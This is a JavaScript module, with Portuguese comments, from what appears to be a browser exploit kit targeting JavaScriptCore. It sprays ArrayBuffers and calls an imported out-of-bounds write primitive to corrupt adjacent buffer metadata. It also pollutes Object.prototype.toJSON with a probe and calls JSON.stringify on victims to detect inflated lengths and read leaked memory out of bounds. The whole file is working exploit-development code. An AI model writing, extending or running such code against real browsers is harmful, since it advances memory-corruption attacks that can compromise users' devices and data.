// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs'; // Adicionado SHORT_PAUSE_S3
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64, // Tamanho original do ArrayBuffer vítima
    spray_count: 1000,  // Número de ArrayBuffers para pulverizar
    probe_victim_step: 100, // Sondar 1 em cada N vítimas pulverizadas
    // Offsets absolutos dentro de oob_array_buffer_real para tentar corromper.
    corruption_offsets: [
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 32, // Mais antes
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 24,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,
    ],
    // Valores a serem escritos nos offsets de corrupção.
    // Adicionar valores que possam corromper o m_impl ou m_byteLength de um AB adjacente.
    // Se um AB vítima está em X, e o header é H, m_impl está em X+H+0x10, m_byteLength em X+H+0x18.
    // A escrita é em oob_array_buffer_real. Se oob_array_buffer_real termina em E,
    // queremos que E + delta_escrita = X + H + offset_metadado.
    // Isso é complexo de alinhar sem feedback preciso.
    // Vamos manter valores genéricos por enquanto e adicionar valores grandes.
    values_to_write: [
        0xFFFFFFFF,       // Valor comum para corrupção
        0x00000000,       // Nulo
        new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF), // Sobrescrita de 64 bits
        new AdvancedInt64(0x00000000, 0x00000040), // Tamanho pequeno (64) em high-dword se fosse um ponteiro para tamanho
        new AdvancedInt64(0x00000000, 0x00010000), // Tamanho maior
    ],
    // Funções toJSON para testar (nome da função como string)
    toJSON_probes_to_use: ["toJSON_LeakMemoryProbe_v1"] // Focar na nova sonda de leak
};

const victim_abs_for_uaf_spray = []; // Array para armazenar os ABs pulverizados

// --- Novas Funções `toJSON` focadas em Leitura OOB ---

export function toJSON_LeakMemoryProbe_v1() {
    const FNAME_PROBE = "toJSON_LeakMemoryProbe_v1";
    const original_expected_size = SPECULATIVE_TEST_CONFIG.victim_ab_size;
    let report = {
        probeName: FNAME_PROBE,
        this_type: Object.prototype.toString.call(this),
        is_array_buffer: false,
        original_length: original_expected_size,
        current_length: "N/A",
        length_inflated: false,
        oob_read_success: false,
        leaked_data_hex: [], // Array de strings hex
        error: null
    };

    if (report.this_type !== '[object ArrayBuffer]') {
        report.error = `this is not [object ArrayBuffer], but ${report.this_type}`;
        logS3(`[${FNAME_PROBE}] ${report.error}`, "warn");
        return report;
    }
    report.is_array_buffer = true;

    try {
        report.current_length = this.byteLength;
        // logS3(`[${FNAME_PROBE}] current_length: ${report.current_length}`, "info");

        if (typeof report.current_length !== 'number' || report.current_length < original_expected_size) {
            report.error = `ByteLength inválido ou menor que o esperado: ${report.current_length}`;
            logS3(`[${FNAME_PROBE}] ${report.error}`, "warn");
            return report;
        }

        if (report.current_length > original_expected_size) {
            report.length_inflated = true;
            logS3(`[${FNAME_PROBE}] TAMANHO INFLADO DETECTADO! Original: ${original_expected_size}, Atual: ${report.current_length}. Tentando leitura OOB...`, "vuln");

            const dv = new DataView(this);
            // Ler até 256 bytes além do tamanho original, ou até o final do buffer corrompido.
            // Cuidado para não ler demais e causar outro crash não informativo.
            const max_oob_read_bytes = Math.min(256, report.current_length - original_expected_size);
            const read_chunk_size = 8; // Ler de 8 em 8 bytes (AdvancedInt64)

            for (let offset = original_expected_size; offset < original_expected_size + max_oob_read_bytes; offset += read_chunk_size) {
                if (offset + read_chunk_size > report.current_length) {
                    // logS3(`[${FNAME_PROBE}] Offset ${toHex(offset)} + ${read_chunk_size} excede o tamanho corrompido ${report.current_length}. Parando leitura.`, "info");
                    break;
                }
                try {
                    const valLow = dv.getUint32(offset, true);
                    const valHigh = dv.getUint32(offset + 4, true);
                    const advInt = new AdvancedInt64(valLow, valHigh);
                    report.leaked_data_hex.push(advInt.toString(true));
                } catch (e_read) {
                    report.error = `Erro durante leitura OOB em ${toHex(offset)}: ${e_read.message}`;
                    logS3(`[${FNAME_PROBE}] ${report.error}`, "error");
                    report.oob_read_success = false; // Marcar que a leitura falhou
                    break;
                }
            }
            if (report.leaked_data_hex.length > 0) {
                report.oob_read_success = true;
                logS3(`[${FNAME_PROBE}] Dados OOB lidos (total ${report.leaked_data_hex.length * read_chunk_size} bytes): ${report.leaked_data_hex.join(', ')}`, "leak");
            }
        } else {
            // logS3(`[${FNAME_PROBE}] Tamanho não inflado. Original: ${original_expected_size}, Atual: ${report.current_length}`, "info");
        }

    } catch (e_access) {
        report.error = `Exceção ao acessar propriedades do ArrayBuffer: ${e_access.name} - ${e_access.message}`;
        logS3(`[${FNAME_PROBE}] ${report.error}`, "critical");
    }
    return report; // Retorna o objeto de relatório
}

// Mapeamento de nomes de sonda para funções reais
const toJSONProbeFunctions = {
    "toJSON_LeakMemoryProbe_v1": toJSON_LeakMemoryProbe_v1,
    // Adicione outras sondas aqui se necessário no futuro
    // "toJSON_LogAndReturnArrayBuffer": toJSON_LogAndReturnArrayBuffer, (do arquivo original)
    // "toJSON_UAF_Trigger_Read": toJSON_UAF_Trigger_Read, (do arquivo original)
};


// --- Função Principal de Teste ---
export async function executeJsonTypeConfusionUAFSpeculativeTest() {
    const FNAME = "executeJsonTypeConfusionUAFSpeculativeTest";
    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (Foco em Leak) ---`, "test", FNAME);

    let overall_success_leak_found = false;

    // 1. Spray de ArrayBuffers vítima
    logS3(`Pulverizando ${SPECULATIVE_TEST_CONFIG.spray_count} ArrayBuffers de ${SPECULATIVE_TEST_CONFIG.victim_ab_size} bytes...`, "info", FNAME);
    victim_abs_for_uaf_spray.length = 0; // Limpar spray anterior
    for (let i = 0; i < SPECULATIVE_TEST_CONFIG.spray_count; i++) {
        victim_abs_for_uaf_spray.push(new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size));
    }
    logS3("Pulverização de ArrayBuffers vítima concluída.", "good", FNAME);
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização do heap

    // 2. Iterar sobre os parâmetros de corrupção e sondas toJSON
    for (const corruption_offset of SPECULATIVE_TEST_CONFIG.corruption_offsets) {
        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write) {
            const value_size = isAdvancedInt64Object(value_to_write) ? 8 : 4;
            const value_hex = isAdvancedInt64Object(value_to_write) ? value_to_write.toString(true) : toHex(value_to_write);

            logS3(`\n[${FNAME}] Tentando corrupção: Offset ${toHex(corruption_offset)}, Valor ${value_hex} (Tamanho ${value_size})`, "test", FNAME);

            // 2a. Configurar ambiente OOB e realizar a escrita de corrupção
            if (!triggerOOB_primitive()) {
                logS3("Falha ao inicializar ambiente OOB. Abortando esta iteração.", "critical", FNAME);
                continue;
            }
            if (!oob_write_absolute(corruption_offset, value_to_write, value_size)) {
                logS3("Falha ao escrever valor de corrupção. Abortando esta iteração.", "error", FNAME);
                clearOOBEnvironment();
                continue;
            }
            logS3("   Valor de corrupção escrito com sucesso no oob_array_buffer_real.", "good", FNAME);
            await PAUSE_S3(SHORT_PAUSE_S3);


            for (const toJSON_probe_name of SPECULATIVE_TEST_CONFIG.toJSON_probes_to_use) {
                const toJSON_function_to_use = toJSONProbeFunctions[toJSON_probe_name];
                if (!toJSON_function_to_use) {
                    logS3(`Sonda toJSON '${toJSON_probe_name}' não encontrada. Pulando.`, "warn", FNAME);
                    continue;
                }
                logS3(`   Usando sonda toJSON: ${toJSON_probe_name}`, "info", FNAME);

                let pollutionApplied = false;
                let originalToJSONDescriptor = null;
                const ppKey = "toJSON";

                try {
                    // 2b. Poluir Object.prototype.toJSON
                    originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                    Object.defineProperty(Object.prototype, ppKey, {
                        value: toJSON_function_to_use,
                        writable: true, enumerable: false, configurable: true
                    });
                    pollutionApplied = true;

                    // 2c. Sondar um subconjunto das vítimas pulverizadas
                    for (let i = 0; i < victim_abs_for_uaf_spray.length; i += SPECULATIVE_TEST_CONFIG.probe_victim_step) {
                        const victim_ab_candidate = victim_abs_for_uaf_spray[i];
                        // logS3(`    Sondando vítima index ${i} com ${toJSON_probe_name}...`, "info", FNAME);

                        let stringify_result_obj = null;
                        try {
                            // JSON.stringify chamará nossa sonda.
                            // O retorno de JSON.stringify será o objeto que nossa sonda retornou.
                            stringify_result_obj = JSON.stringify(victim_ab_candidate);

                            if (stringify_result_obj && stringify_result_obj.probeName === "toJSON_LeakMemoryProbe_v1") {
                                logS3(`    Resultado da Sonda ${stringify_result_obj.probeName} na vítima ${i}:`, "info", FNAME);
                                logS3(`      Tipo: ${stringify_result_obj.this_type}, É AB: ${stringify_result_obj.is_array_buffer}`, "info", FNAME);
                                logS3(`      Tam Original: ${stringify_result_obj.original_length}, Tam Atual: ${stringify_result_obj.current_length}, Inflado: ${stringify_result_obj.length_inflated}`, "info", FNAME);

                                if (stringify_result_obj.error) {
                                    logS3(`      Erro na sonda: ${stringify_result_obj.error}`, "error", FNAME);
                                }
                                if (stringify_result_obj.length_inflated && stringify_result_obj.oob_read_success) {
                                    logS3(`      !!! VAZAMENTO DE MEMÓRIA OOB OBTIDO !!! Vítima index ${i}`, "vuln", FNAME);
                                    logS3(`        Dados Vazados (hex, 64bit LE): ${stringify_result_obj.leaked_data_hex.join(' | ')}`, "leak", FNAME);
                                    overall_success_leak_found = true;
                                    document.title = `SUCCESS: Memory Leak @ offset ${toHex(corruption_offset)}, val ${value_hex}`;
                                    // Poderia dar um 'return' aqui para parar tudo no primeiro leak
                                } else if (stringify_result_obj.length_inflated) {
                                    logS3(`      Tamanho inflado mas leitura OOB falhou ou não retornou dados. Erro: ${stringify_result_obj.error || 'N/A'}`, "warn", FNAME);
                                }
                            }

                        } catch (e_stringify) {
                            logS3(`    !!!! ERRO CRÍTICO em JSON.stringify(vítima ${i}) com ${toJSON_probe_name} (Offset: ${toHex(corruption_offset)}, Val: ${value_hex}) !!!!: ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME);
                            if (e_stringify.stack) logS3(`       Stack: ${e_stringify.stack}`, "critical");
                            // Se houver crash aqui, este é o ponto de interesse
                        }
                        if (overall_success_leak_found) break; // Sair do loop de vítimas se já achamos um leak
                    } // Fim do loop de vítimas

                } catch (mainIterationError) {
                    logS3(`Erro na iteração principal (Offset: ${toHex(corruption_offset)}, Val: ${value_hex}): ${mainIterationError.message}`, "error", FNAME);
                    console.error(mainIterationError);
                } finally {
                    if (pollutionApplied) {
                        if (originalToJSONDescriptor) {
                            Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                        } else {
                            delete Object.prototype[ppKey];
                        }
                    }
                }
                if (overall_success_leak_found) break; // Sair do loop de sondas toJSON
            } // Fim do loop de sondas toJSON
            clearOOBEnvironment(); // Limpar oob_array_buffer_real para a próxima corrupção
            if (overall_success_leak_found) break; // Sair do loop de values_to_write
        } // Fim do loop de values_to_write
        if (overall_success_leak_found) break; // Sair do loop de corruption_offsets
    } // Fim do loop de corruption_offsets

    clearOOBEnvironment();
    victim_abs_for_uaf_spray.length = 0; // Limpar referências
    if (overall_success_leak_found) {
        logS3(`--- Teste Especulativo (Foco em Leak) Concluído: SUCESSO NO VAZAMENTO DE MEMÓRIA! ---`, "vuln", FNAME);
    } else {
        logS3(`--- Teste Especulativo (Foco em Leak) Concluído: Nenhum vazamento de memória óbvio detectado. ---`, "good", FNAME);
    }
}
